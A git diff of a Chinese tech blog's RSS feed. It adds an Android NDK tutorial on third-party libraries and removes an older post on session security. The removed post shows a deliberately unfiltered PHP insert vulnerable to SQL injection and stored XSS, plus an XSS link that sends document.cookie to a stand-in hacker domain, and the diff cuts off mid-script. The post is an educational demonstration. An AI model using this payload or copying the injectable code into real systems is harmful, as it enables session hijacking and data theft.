@@ -1,5 +1,96 @@
 <?xml version="1.0" encoding="UTF-8"?>
-<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title><![CDATA[白一梓的个人博客]]></title><description><![CDATA[A blog about tech.]]></description><link>http://blog.whyun.com</link><generator>RSS for Node</generator><lastBuildDate>Sat, 05 Dec 2015 13:07:27 GMT</lastBuildDate><atom:link href="http://blog.whyun.com/feed.xml" rel="self" type="application/rss+xml"/><author><![CDATA[白一梓]]></author><pubDate>Sat, 05 Dec 2015 13:07:27 GMT</pubDate><copyright><![CDATA[2015 白一梓]]></copyright><language><![CDATA[en]]></language><managingEditor><![CDATA[白一梓]]></managingEditor><webMaster><![CDATA[白一梓]]></webMaster><ttl>60</ttl><item><title><![CDATA[JNI系列教程三 —— NDK入门]]></title><description><![CDATA[<h2><a name="3-1" class="anchor" href="#3-1"><span class="header-link"></span></a>3.1 背景</h2>
+<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title><![CDATA[白一梓的个人博客]]></title><description><![CDATA[A blog about tech.]]></description><link>http://blog.whyun.com</link><generator>RSS for Node</generator><lastBuildDate>Thu, 31 Dec 2015 13:39:04 GMT</lastBuildDate><atom:link href="http://blog.whyun.com/feed.xml" rel="self" type="application/rss+xml"/><author><![CDATA[白一梓]]></author><pubDate>Thu, 31 Dec 2015 13:39:04 GMT</pubDate><copyright><![CDATA[2015 白一梓]]></copyright><language><![CDATA[en]]></language><managingEditor><![CDATA[白一梓]]></managingEditor><webMaster><![CDATA[白一梓]]></webMaster><ttl>60</ttl><item><title><![CDATA[JNI系列教程之四——在NDK中使用第三方库]]></title><description><![CDATA[<h1><a name="4-ndk" class="anchor" href="#4-ndk"><span class="header-link"></span></a>4.在NDK中使用第三方库</h1>
+<h2><a name="4-1" class="anchor" href="#4-1"><span class="header-link"></span></a>4.1 背景</h2>
+<p>既然使用NDK，一般两个常见的原因，一个就是java代码运行效率低，还有一个就是之前和c相关的类库已经在其它项目中准备好了，这样使用NDK就可以尽可能的复用代码。</p>
+<blockquote>
+<p>本文源地址：<a href="http://blog.whyun.com/posts/jni/use-thrid-part-library-in-ndk/">http://blog.whyun.com/posts/jni/use-thrid-part-library-in-ndk/</a> 转载请注明出处。</p>
+</blockquote>
+<h2><a name="4-2" class="anchor" href="#4-2"><span class="header-link"></span></a>4.2 使用第三方库源码</h2>
+<p>假设你将第三方库做成动态库，并且你在JNI中还引用了这个动态库，不要企盼着把你的JNI库和这个第三方库放到同一个目录（比如说android项目的<code>libs/armeabi</code>目录）下就万事大吉了，很不幸的告诉你，JNI代码在被运行在android上时不能引用非<code>/system/lib</code>下的动态库。安卓操作系统的系统库文件都是放到<code>/system/lib</code>下的，如果你的JNI代码想引用一些第三方库的功能，就得考虑将第三方库做成静态库，继而打入你生成的jni库中。<br>再假设你就是第三方库的提供方，你需要将你写的代码提供给你的客户，而且你还想在做完库文件后还有一个测试程序，那么你可以在<code>Android.mk</code>中先编译出来一个静态库，然后再编译一个测试用的JNI动态库。你可能会有疑问，同一个<code>Android.mk</code>可以生成多个文件吗，答案是肯定的。<br>还是先看一个官方的例子，在NDK路径下，进入目录<code>sample\two-libs</code>,然后打开<code>jni</code>目录中的<code>Android.mk</code>：</p>
+<pre><code><div class="highlight"><pre><span class="nx">LOCAL_PATH</span><span class="o">:=</span> <span class="nx">$</span><span class="p">(</span><span class="nx">call</span> <span class="nx">my</span><span class="o">-</span><span class="nx">dir</span><span class="p">)</span>
+
+<span class="err">#</span> <span class="nx">first</span> <span class="nx">lib</span><span class="p">,</span> <span class="nx">which</span> <span class="nx">will</span> <span class="nx">be</span> <span class="nx">built</span> <span class="nx">statically</span>
+<span class="err">#</span>
+<span class="nx">include</span> <span class="nx">$</span><span class="p">(</span><span class="nx">CLEAR_VARS</span><span class="p">)</span>
+
+<span class="nx">LOCAL_MODULE</span>    <span class="o">:=</span> <span class="nx">libtwolib</span><span class="o">-</span><span class="nx">first</span>
+<span class="nx">LOCAL_SRC_FILES</span> <span class="o">:=</span> <span class="nx">first</span><span class="p">.</span><span class="nx">c</span>
+
+<span class="nx">include</span> <span class="nx">$</span><span class="p">(</span><span class="nx">BUILD_STATIC_LIBRARY</span><span class="p">)</span>
+
+<span class="err">#</span> <span class="nx">second</span> <span class="nx">lib</span><span class="p">,</span> <span class="nx">which</span> <span class="nx">will</span> <span class="nx">depend</span> <span class="nx">on</span> <span class="nx">and</span> <span class="nx">include</span> <span class="nx">the</span> <span class="nx">first</span> <span class="nx">one</span>
+<span class="err">#</span>
+<span class="nx">include</span> <span class="nx">$</span><span class="p">(</span><span class="nx">CLEAR_VARS</span><span class="p">)</span>
+
+<span class="nx">LOCAL_MODULE</span>    <span class="o">:=</span> <span class="nx">libtwolib</span><span class="o">-</span><span class="nx">second</span>
+<span class="nx">LOCAL_SRC_FILES</span> <span class="o">:=</span> <span class="nx">second</span><span class="p">.</span><span class="nx">c</span>
+
+<span class="nx">LOCAL_STATIC_LIBRARIES</span> <span class="o">:=</span> <span class="nx">libtwolib</span><span class="o">-</span><span class="nx">first</span>
+
+<span class="nx">include</span> <span class="nx">$</span><span class="p">(</span><span class="nx">BUILD_SHARED_LIBRARY</span><span class="p">)</span>
+</pre></div>
+</code></pre>
+<p><strong>代码4.2.1 Android.mk</strong><br>一般情况下，我们都会写<code>include $(BUILD_SHARED_LIBRARY)</code>来生成JNI库，但是这个项目在编译动态库之前先编译生成了一个静态库，编译静态库的时候同样指定了参数<code>LOCAL_MODULE</code>和<code>LOCAL_SRC_FILES</code>参数，但是下面编译动态库的时候也指定了这两个参数啊，难道不冲突？当然不冲突，因为我们用了这句话——<code>include $(CLEAR_VARS)</code>,调用了它就会把之前所有定义的<code>LOCAL_</code>开头的变量全部清空。配置的前半部分生成了静态库<code>libtwolib-first.a</code>，配置的后半部分注意<code>LOCAL_STATIC_LIBRARIES</code>这个变量，其值正是静态库的<code>LOCAL_MODULE</code>名称。  </p>
+<h2><a name="4-3" class="anchor" href="#4-3"><span class="header-link"></span></a>4.3 使用第三方库文件</h2>
+<p>我们在4.2中做出来了一个静态库（那个静态库在项目的<code>obj\local\{abi}</code>目录可以得到，abi为具体的cpu类型），本意是给客户提供一个可以调用的库文件，现在假设你就是那个客户，手里拿到了库文件，但是没有源码，该怎么使用来？这就要提到<code>PREBUILD_</code>类型变量，先看例子：</p>
+<pre><code><div class="highlight"><pre><span class="nx">LOCAL_PATH</span><span class="o">:=</span> <span class="nx">$</span><span class="p">(</span><span class="nx">call</span> <span class="nx">my</span><span class="o">-</span><span class="nx">dir</span><span class="p">)</span>
+
+<span class="err">#</span> <span class="nx">first</span> <span class="nx">lib</span><span class="p">,</span> <span class="nx">which</span> <span class="nx">will</span> <span class="nx">be</span> <span class="nx">built</span> <span class="nx">statically</span>
+<span class="err">#</span>
+<span class="nx">include</span> <span class="nx">$</span><span class="p">(</span><span class="nx">CLEAR_VARS</span><span class="p">)</span>
+
+<span class="err">#</span><span class="nx">$</span><span class="p">(</span><span class="nx">info</span> <span class="nx">$</span><span class="p">(</span><span class="nx">TARGET_ARCH_ABI</span><span class="p">))</span>
+
+<span class="nx">LOCAL_MODULE</span> <span class="o">:=</span> <span class="nx">libtwolib</span><span class="o">-</span><span class="nx">first</span>
+<span class="nx">LOCAL_SRC_FILES</span> <span class="o">:=</span> <span class="p">..</span><span class="o">/</span><span class="nx">obj</span><span class="o">/</span><span class="nx">local</span><span class="o">/</span><span class="nx">$</span><span class="p">(</span><span class="nx">TARGET_ARCH_ABI</span><span class="p">)</span><span class="o">/</span><span class="nx">libtwolib</span><span class="o">-</span><span class="nx">first</span><span class="p">.</span><span class="nx">a</span>
+<span class="nx">include</span> <span class="nx">$</span><span class="p">(</span><span class="nx">PREBUILT_STATIC_LIBRARY</span><span class="p">)</span>
+
+<span class="err">#</span> <span class="nx">second</span> <span class="nx">lib</span><span class="p">,</span> <span class="nx">which</span> <span class="nx">will</span> <span class="nx">depend</span> <span class="nx">on</span> <span class="nx">and</span> <span class="nx">include</span> <span class="nx">the</span> <span class="nx">first</span> <span class="nx">one</span>
+<span class="err">#</span>
+<span class="nx">include</span> <span class="nx">$</span><span class="p">(</span><span class="nx">CLEAR_VARS</span><span class="p">)</span>
+
+<span class="nx">LOCAL_MODULE</span>    <span class="o">:=</span> <span class="nx">libtwolib</span><span class="o">-</span><span class="nx">second</span>
+<span class="nx">LOCAL_SRC_FILES</span> <span class="o">:=</span> <span class="nx">second</span><span class="p">.</span><span class="nx">c</span>
+
+<span class="nx">LOCAL_STATIC_LIBRARIES</span> <span class="o">:=</span> <span class="nx">libtwolib</span><span class="o">-</span><span class="nx">first</span>
+
+<span class="nx">include</span> <span class="nx">$</span><span class="p">(</span><span class="nx">BUILD_SHARED_LIBRARY</span><span class="p">)</span>
+</pre></div>
+</code></pre>
+<p><strong>代码 4.3.1 Android-static.mk</strong><br>一般<code>LOCAL_SRC_FILES</code>是要写c/c++文件的，现在却直接写了一个动态库文件，然后引入<code>PREBUILT_STATIC_LIBRARY</code>来使用NDK的预编译功能，告诉编译器这个库文件已经编译好了，可以直接在下面的编译的中引用。我们看到最终在编译<code>twolib-second</code>库中，使用变量<code>LOCAL_STATIC_LIBRARIES</code>来将其引入。
+最后运行<code>ndk-build APP_BUILD_SCRIPT=Android-static.mk</code>进行编译，因为我们这里没有使用默认的mk文件名，所以使用参数<code>APP_BUILD_SCRIPT</code>来指定使用的mk文件。</p>
+<h2><a name="4-4" class="anchor" href="#4-4"><span class="header-link"></span></a>4.4 指定预编译库的头文件路径</h2>
+<p>一些成熟的开源库提供了对于安卓环境的编译支持，你可以使用<code>ndk-build</code>来生成库文件。然后使用4.3的方法引入预编译库，但是对于这种开源库，我们引入头文件都是采用<code>#include&lt;xxx.h&gt;</code>这种方式，这时候就需要指定一个头文件的搜索路径，这就是<code>LOCAL_EXPORT_C_INCLUDES</code>变量的作用。下面是一个引用openssl的例子:</p>
+<pre><code><div class="highlight"><pre><span class="nx">LOCAL_PATH</span> <span class="o">:=</span> <span class="nx">$</span><span class="p">(</span><span class="nx">call</span> <span class="nx">my</span><span class="o">-</span><span class="nx">dir</span><span class="p">)</span>
+
+<span class="nx">include</span> <span class="nx">$</span><span class="p">(</span><span class="nx">CLEAR_VARS</span><span class="p">)</span>
+<span class="nx">LOCAL_MODULE</span> <span class="o">:=</span> <span class="nx">crypto</span>
+<span class="nx">LOCAL_SRC_FILES</span> <span class="o">:=</span> <span class="nx">libcrypto</span><span class="p">.</span><span class="nx">so</span>
+<span class="nx">LOCAL_EXPORT_C_INCLUDES</span> <span class="o">:=</span> <span class="nx">$</span><span class="p">(</span><span class="nx">LOCAL_PATH</span><span class="p">)</span><span class="o">/</span><span class="nx">include</span>
+<span class="nx">include</span> <span class="nx">$</span><span class="p">(</span><span class="nx">PREBUILT_SHARED_LIBRARY</span><span class="p">)</span>
+
+<span class="nx">include</span> <span class="nx">$</span><span class="p">(</span><span class="nx">CLEAR_VARS</span><span class="p">)</span>
+
+<span class="nx">LOCAL_MODULE</span>    <span class="o">:=</span> <span class="nx">libchapter4</span>
+<span class="err">#</span><span class="nx">LOCAL_C_INCLUDES</span> <span class="o">:=</span> <span class="nx">$</span><span class="p">(</span><span class="nx">SYSROOT</span><span class="p">)</span><span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">include</span>
+<span class="nx">LOCAL_LDLIBS</span> <span class="o">:=</span> <span class="o">-</span><span class="nx">L$</span><span class="p">(</span><span class="nx">SYSROOT</span><span class="p">)</span><span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">lib</span> <span class="o">-</span><span class="nx">llog</span>
+
+<span class="nx">LOCAL_SRC_FILES</span> <span class="o">:=</span> <span class="nx">chapter4</span><span class="p">.</span><span class="nx">c</span>
+
+<span class="nx">LOCAL_SHARED_LIBRARIES</span> <span class="o">:=</span> <span class="nx">crypto</span>
+<span class="nx">include</span> <span class="nx">$</span><span class="p">(</span><span class="nx">BUILD_SHARED_LIBRARY</span><span class="p">)</span>
+
+<span class="nx">TARGET_PLATFORM</span> <span class="o">:=</span> <span class="nx">android</span><span class="o">-</span><span class="mi">3</span>
+</pre></div>
+</code></pre>
+<p>这里在和<code>chapter4.c</code>同级的目录下，须有有个<code>include</code>文件夹，然后在里面放openssl文件夹，当然这个openssl文件夹里就是一堆openssl的头文件。这样我们在代码中就可以这么写了：<br><code>#include &lt;openssl/pkcs12.h&gt;</code><br>在编译的时候，编译器就会去加载jni目录下的<code>include/openssl/pkcs12.h</code>文件。  </p>
+<blockquote>
+<p>其实libcrypto.so在安卓系统的<code>/system/lib</code>就存在了，虽然编译完成之后libcrypto.so会被拷贝到安卓项目的libs目录的armeabi下，但是在APP运行时读取的还是<code>/system/lib</code>下的libcrypto.so。可以把libcrypto.so和openssl文件目录分别拷贝到NDK目录下的<code>platforms\android-3\arch-arm\usr</code>中的<code>lib</code>和<code>include</code>目录，这样不需要写<code>include $(PREBUILT_SHARED_LIBRARY)</code>代码块了。</p>
+</blockquote>
+<pre><code><div class="highlight"><pre><span class="err">本文用的代码可以从</span><span class="nx">http</span><span class="o">:</span><span class="c1">//git.oschina.net/yunnysunny/ndk/tree/master/chapter4 获取。</span>
+</pre></div>
+</code></pre>
+]]></description><link>http://blog.whyun.com/posts/jnindk/use-thrid-part-library-in-ndk/</link><guid isPermaLink="true">http://blog.whyun.com/posts/jnindk/use-thrid-part-library-in-ndk/</guid><dc:creator><![CDATA[白一梓]]></dc:creator><pubDate>Thu, 31 Dec 2015 00:00:00 GMT</pubDate></item><item><title><![CDATA[JNI系列教程三 —— NDK入门]]></title><description><![CDATA[<h2><a name="3-1" class="anchor" href="#3-1"><span class="header-link"></span></a>3.1 背景</h2>
 <p>谈到JNI的使用场景，最常用的就是android NDK的编写了。首先从<a href="http://developer.android.com/ndk/downloads/index.html#download">http://developer.android.com/ndk/downloads/index.html#download</a> 把最新版的NDK下载下来。下载完之后得到一个exe文件，这其实是一个自解压文件，运行后自动解压，解压完成后的文件夹有3GB，所以你的磁盘空间起码得留足5GB左右的剩余空间。
 最终我们得到这么一个目录结构：</p>
 <p><img src="/images/ndk_dir.jpg" alt="ndk目录结构"><br><strong>图3.1.1 ndk目录结构</strong><br>接着需要将ndk所在目录添加到环境变量PATH中，这样在以后运行的时候，只需要输出<code>ndk-buld</code>就可以了。文件夹<code>plantforms</code>存放着编译各个版本的android所需的头文件和动态库，举个例子<code>platforms/android-3/arch-arm</code>文件夹下存放的是<code>android 1.5</code>版本的<code>arm</code>平台的头文件和库文件，从<code>android 2.3</code>开始，开始支持<code>x86</code>和<code>mips</code>两个平台，所以在<code>platforms/android-9</code>目录下会有<code>arch-arm</code> <code>arch-mips</code> <code>arch-x86</code>三个文件夹。</p>
@@ -1212,156 +1303,4 @@ Nothing! <code>v8::String::AsciiValue</code>本来就有问题：它的名字告
 <p>在打开的界面中点击环境变量配置功能按钮<br><img src="/images/set_env_show.jpg" alt="配置界面"><br><strong>图1.2 配置界面</strong></p>
 <p>添加一个环境变量<br><img src="/images/add_env.jpg" alt="添加环境变量"><br><strong>图1.3 添加环境变量</strong>  </p>
 <p>至此完成配置，点击调试后，就会将当前的代码运行成单进程，在生产环境中不加环境变量启动，则运行到正常的cluster代码中。</p>
-]]></description><link>http://blog.whyun.com/posts/node/</link><guid isPermaLink="true">http://blog.whyun.com/posts/node/</guid><dc:creator><![CDATA[白一梓]]></dc:creator><pubDate>Thu, 31 Jul 2014 00:00:00 GMT</pubDate></item><item><title><![CDATA[session的安全性]]></title><description><![CDATA[<h2><a name="session" class="anchor" href="#session"><span class="header-link"></span></a>session原理</h2>
-<p>提到session，大家肯定会联想到登录，登录成功后记录登录状态，同时标记当前登录用户是谁。功能大体上就是这个样子，但是今天要讲的不是功能，而是实现。通过探讨session的实现方式来发掘一些可能你之前不知道的有趣的事情。<br>为了记录session，在客户端和服务器端都要保存数据，客户端记录一个标记，服务器端不但存储了这个标记同时还存储了这个标记映射的数据。好吧，还是说点白话吧，在客户端记录的其实是一个sessionid，在服务器端记录的是一个key-value形式的数据结构，这里的key肯定是指sessionid了，value就代表session的详细内容。用户在做http请求的时候，总是会把sessionid传递给服务器，然后服务器根据这个sessionid来查询session的内容（也就是上面说到的value）。<br>现在我们重点关注一下sessionid，他是今天问题的关键所在。sessionid在客户端（http的客户端一般就是指浏览器了）是存储在cookie中，当然也有例外（书本上肯定会提到也有保存在url中的，我做程序员这么多年也没有见过这种方式，这难道就是现实和实际的差距吗，好残酷）。
-我们通过一个例子来阐述一下这个sessionid在session处理时的作用。首先假定这么一个场景，我们有一个cms（content management system，内容管理系统），这个应用有一个后台，用户必须登录才能进入后台进行文章发表等操作。首先是登录流程，用户在浏览器输入用户名、密码，点击登录，浏览器会将用户名密码提交到服务器程序进行处理；服务器验证用户名、密码正确后，会返回登录成功信息，并且会修改服务器端的session内容，比如我们将用户ID写入session中，为了方便存储这些session的内容会被序列化成字符串或者二进制保存在文件或者数据库中，这时候大多数情况下服务器在对当前的http请求进行响应时，会返回一个新的sessionid要求浏览器写入本地cookie中，对应的返回的http响应头部信息应该会是是这个样子的：<code>set-cookie:PHPSESSID=xxxxxxx</code>,浏览器解析到这个头之后就会在当前生成一个cookie关联当前的域名。
-<img src="http://git.oschina.net/yunnysunny/hack/raw/master/session/img/login.png" alt="登录时序图">
-<strong>图1.1 登录时序图</strong>
-接着用户登录后台进行发表文章操作，登录用户填写文章的标题、内容，然后点击发送。这时候浏览器会生成一条到服务器的http请求，注意这个请求的头部会将存储sessionid的cookie内容发送过去，也就是说请求的http头部信息中应该会有这么一段数据：<code>cookie:PHPSESSID=xxxxxxx;other_cookie_name=yyyyyy</code>；服务器接收到这个http请求之后，解析到cookie存在，且cookie中存在PHPSESSID这个cookie名字，然后就将PHPSESSID的值（也就是sessionid的值）取出来，根据这个PHPSESSID查询服务器上有没有对应的session内容，如果有则将其对应的值取出来进行反序列序列化（也就是将其转成编程语言中的一个数据结果，比如在php中会得到一个<code>$_SESSION</code>数组，在j2ee中会得到类型为<code>javax.servlet.http.HttpSession</code>），方便在程序中进行读取，最终服务器认定session中储存的值存在，并且从反序列化得到的对象中读取到了用户ID属性，然后就往cms数据库的文章表中插入了一条数据，最终返回http响应，告诉浏览器操作成功了。
-<img src="http://git.oschina.net/yunnysunny/hack/raw/master/session/img/publish.png" alt="发表文章时序图">
-<strong>图1.2 发表文章时序图</strong></p>
-<h2><a name="" class="anchor" href="#"><span class="header-link"></span></a>入侵示例</h2>
-<p>关于cookie的一些属性，可以参考我的另一篇博文<a href="http://blog.csdn.net/yunnysunny/article/details/7748106" title="关于cookie的一些事">关于cookie的一些事</a>，里面会提到一个httponly的属性，也就是是否禁止js读取cookie。不幸的是很多常见的服务器（比如apache和tomcat）在生成这个存储sessionid的cookie的时候，没有设置httponly这个属性，也就是说js是可以将这个sessionid读取出来的。<br>js读取到sessionid，这会有问题吗？如果没有问题，我就不在这里啰嗦了。你网站上的运行的js代码并不一定是你写的，比如说一般网站都有一个发表文章或者说发帖的功能，如果别有用心的人在发表的时候填写了html代码（这些html一般是超链接或者图片），但是你的后台又没有将其过滤掉，发表出来的文章，被其他人点击了其中恶意链接时，就出事了。这也就是我们常说的XSS。 </p>
-<pre><code class="lang-php"><div class="highlight"><pre><span class="x">    </span><span class="cp">&lt;?php</span>
-    <span class="nb">session_start</span><span class="p">();</span>
-    <span class="nv">$result</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
-    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;uid&#39;</span><span class="p">])</span> <span class="o">||</span> <span class="o">!</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;uid&#39;</span><span class="p">])</span> <span class="p">{</span>
-        <span class="nv">$result</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
-        <span class="nv">$result</span><span class="p">[</span><span class="s1">&#39;msg&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;尚未登录&#39;</span><span class="p">;</span>
-    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
-        <span class="nv">$uid</span> <span class="o">=</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;uid&#39;</span><span class="p">];</span>
-        <span class="k">require_once</span><span class="p">(</span><span class="s1">&#39;../globaldb.php&#39;</span><span class="p">);</span>
-        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;title&#39;</span><span class="p">])</span> <span class="o">||</span> <span class="o">!</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;title&#39;</span><span class="p">])</span> <span class="p">{</span>
-            <span class="nv">$result</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="mi">4</span><span class="p">;</span>
-            <span class="nv">$result</span><span class="p">[</span><span class="s1">&#39;msg&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;标题为空&#39;</span><span class="p">;</span>
-            <span class="nx">goto</span> <span class="nb">end</span><span class="p">;</span>
-        <span class="p">}</span>
-        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;content&#39;</span><span class="p">])</span> <span class="o">||</span> <span class="o">!</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;content&#39;</span><span class="p">])</span> <span class="p">{</span>
-            <span class="nv">$result</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="mi">4</span><span class="p">;</span>
-            <span class="nv">$result</span><span class="p">[</span><span class="s1">&#39;msg&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;内容为空&#39;</span><span class="p">;</span>
-            <span class="nx">goto</span> <span class="nb">end</span><span class="p">;</span>
-        <span class="p">}</span>
-
-        <span class="k">if</span> <span class="p">(</span><span class="nv">$db</span><span class="o">-&gt;</span><span class="na">getStatus</span><span class="p">())</span> <span class="p">{</span>
-            <span class="nv">$title</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;title&#39;</span><span class="p">];</span>
-            <span class="nv">$content</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;content&#39;</span><span class="p">];</span>
-            <span class="nv">$sql</span> <span class="o">=</span> <span class="s1">&#39;insert into article(title,content,uid,create_time) values(&quot;&#39;</span><span class="o">.</span><span class="nv">$title</span><span class="o">.</span><span class="s1">&#39;&quot;,&quot;&#39;</span><span class="o">.</span><span class="nv">$content</span><span class="o">.</span><span class="s1">&#39;&quot;,&#39;</span><span class="o">.</span><span class="nv">$uid</span><span class="o">.</span><span class="s1">&#39;,now())&#39;</span><span class="p">;</span>
-            <span class="nv">$rv</span> <span class="o">=</span> <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">dbExecute</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
-            <span class="k">if</span> <span class="p">(</span><span class="nv">$rv</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
-                <span class="nv">$result</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
-            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
-                <span class="nv">$result</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="mi">3</span><span class="p">;</span>
-                <span class="nv">$result</span><span class="p">[</span><span class="s1">&#39;msg&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;插入失败&#39;</span><span class="p">;</span>
-            <span class="p">}</span>
-        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
-            <span class="nv">$result</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
-            <span class="nv">$result</span><span class="p">[</span><span class="s1">&#39;msg&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;数据库操作失败&#39;</span><span class="p">;</span>
-        <span class="p">}</span>
-    <span class="p">}</span>
-    <span class="nb">end</span><span class="o">:</span>
-    <span class="k">echo</span> <span class="p">(</span><span class="nb">json_encode</span><span class="p">(</span><span class="nv">$result</span><span class="p">));</span>
-</pre></div>
-</code></pre>
-<p><strong>代码2.1 添加文章的后台代码</strong>
-这里给出了一段不靠谱代码，之所以这么说是由于对于提交的内容没有做过滤，比如说<code>content</code>表单域的内容。现在假设有这么两个网站，一个你自己的CMS网站，域名<code>mycms.whyun.com</code>,一个黑客用的网站，域名<code>session.myhack.com</code>。你可以通过配置hosts来模拟这两个网站，说到这里可还是推荐一下我之前做过的<a href="http://git.oschina.net/yunnysunny/addhost" title="addhost">addhost</a>工具，可以自动生成hosts和vhost配置。代码2.1正是mycms网站的代码。<br>登录mycms后在后台添加一篇文章，文章内容为：</p>
-<pre><code><div class="highlight"><pre><span class="o">&lt;</span><span class="nx">a</span> <span class="nx">href</span><span class="o">=</span><span class="err">\</span><span class="s2">&quot;#\&quot;</span> <span class="nx">onclick</span><span class="o">=</span><span class="err">\</span><span class="s1">&#39;javascript:alert(document.cookie);return false;\&#39;</span><span class="o">&gt;</span><span class="err">点击我，有惊喜！</span><span class="o">&lt;</span><span class="err">/a&gt;</span>
-</pre></div>
-</code></pre>
-<p><strong>代码2.2 alert cookie</strong>
-<img src="http://git.oschina.net/yunnysunny/hack/raw/master/session/img/show_cookie.jpg" alt="显示cookie的html">
-<strong>图2.1 显示cookie的html</strong></p>
-<p>打开刚才生成的文章链接，然后点击<code>点击我，有惊喜！</code>,会显示当前域下的所有cookie。
-<img src="http://git.oschina.net/yunnysunny/hack/raw/master/session/img/alert_cookie.jpg" alt="coookie被alert出来">
-<strong>图2.2 cookie被alert出来</strong></p>
-<p>当然要想做到攻击的目的仅仅做这些是不够的，下面将这个链接的内容做的丰富多彩些。</p>
-<pre><code><div class="highlight"><pre><span class="o">&lt;</span><span class="nx">a</span> <span class="nx">href</span><span class="o">=</span><span class="err">\</span><span class="s2">&quot;#\&quot; onclick=\&#39;javascript:var link = this; var head = document.getElementsByTagName(\&quot;head\&quot;)[0]; var js = document.createElement(\&quot;script\&quot;); js.src = \&quot;http://session.myhack.com/httphack.php?cook=\&quot;+encodeURIComponent(document.cookie); js.onload = js.onreadystatechange = function(){ if (!this.readyState || this.readyState == \&quot;loaded\&quot; || this.readyState == \&quot;complete\&quot;) {head.removeChild(js);  alert(\&quot;over\&quot;</span><span class="p">);</span> <span class="p">}</span> <span class="p">};</span> <span class="nx">head</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">js</span><span class="p">);</span><span class="k">return</span> <span class="kc">false</span><span class="p">;</span><span class="err">\&#39;</span><span class="o">&gt;</span><span class="err">点击我，有惊喜</span><span class="mi">2</span><span class="err">！</span><span class="o">&lt;</span><span class="err">/a&gt;</span>
-</pre></div>
-</code></pre>
-<p><strong>代码2.3 跨站请求</strong><br>这里为了将代码嵌入html，得将其写作一行，其简洁模式为：</p>
-<pre><code class="lang-javascript"><div class="highlight"><pre>    <span class="kd">var</span> <span class="nx">link</span> <span class="o">=</span> <span class="k">this</span><span class="p">;</span>
-    <span class="kd">var</span> <span class="nx">head</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementsByTagName</span><span class="p">(</span><span class="s2">&quot;head&quot;</span><span class="p">)[</span><span class="mi">0</span><span class="p">];</span> 
-    <span class="kd">var</span> <span class="nx">js</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s2">&quot;script&quot;</span><span class="p">);</span> 
-    <span class="nx">js</span><span class="p">.</span><span class="nx">src</span> <span class="o">=</span> <span class="s2">&quot;http://session.myhack.com/httphack.php?cook=&quot;</span><span class="o">+</span><span class="nb">encodeURIComponent</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">);</span> 
-    <span class="nx">js</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="nx">js</span><span class="p">.</span><span class="nx">onreadystatechange</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(){</span> 
-        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">this</span><span class="p">.</span><span class="nx">readyState</span> <span class="o">||</span> <span class="k">this</span><span class="p">.</span><span class="nx">readyState</span> <span class="o">==</span> <span class="s2">&quot;loaded&quot;</span> <span class="o">||</span> <span class="k">this</span><span class="p">.</span><span class="nx">readyState</span> <span class="o">==</span> <span class="s2">&quot;complete&quot;</span><span class="p">)</span> <span class="p">{</span> 
-            <span class="nx">head</span><span class="p">.</span><span class="nx">removeChild</span><span class="p">(</span><span class="nx">js</span><span class="p">);</span> 
-            <span class="nx">alert</span><span class="p">(</span><span class="s1">&#39;开始跳转真正的地址&#39;</span><span class="p">);</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="o">=</span><span class="nx">link</span><span class="p">.</span><span class="nx">getAttribute</span><span class="p">(</span><span class="s2">&quot;href&quot;</span><span class="p">);</span><span class="c1">//</span>
